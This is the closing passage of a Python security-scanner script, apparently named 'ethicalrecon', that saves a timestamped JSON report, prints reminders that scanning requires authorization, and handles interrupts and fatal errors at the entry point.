        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = output_dir / f"ethicalrecon_{timestamp}.json"
        scanner.generate_report(str(output_file), 'json')
    
    # Legal reminder
    print(f"\n{Colors.PURPLE}[REMINDER]{Colors.RESET} This tool is for authorized security testing only.")
    print(f"{Colors.PURPLE}[REMINDER]{Colors.RESET} Ensure you have permission before scanning any targets.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[INTERRUPTED]{Colors.RESET} Scan interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.RED}[FATAL ERROR]{Colors.RESET} {str(e)}")
        sys.exit(1)
